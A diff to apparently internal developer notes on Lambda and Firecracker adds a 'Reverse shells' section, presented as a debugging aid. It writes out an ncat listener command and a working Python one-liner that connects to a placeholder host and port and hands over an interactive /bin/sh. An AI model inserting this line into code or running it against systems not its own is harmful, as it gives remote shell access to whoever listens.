@@ -151,6 +151,22 @@ with
 sudo losetup -d /dev/loopX
 ```
 
+## Reverse shells
+
+One way to debug a Lambda function is to use a reverse shell. On the host, open a port `${port}` and run
+
+```bash
+sudo apt install ncat
+nc -nvlp ${port}
+```
+
+If you are using a Python Lambda function, then including this line in your code will "phone home" to your host IP `${host}` and allow you to run a bash shell inside the Lambda function container:
+
+```python
+# From https://github.com/lukechilds/reverse-shell/blob/f6d08688544d459a6617176897f6ba8d30c3f300/api/index.js#L20
+import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);
+```
+
 ## TODO
 * jailer for firecracker-containerd - why jailer=noop?
 * memory limits
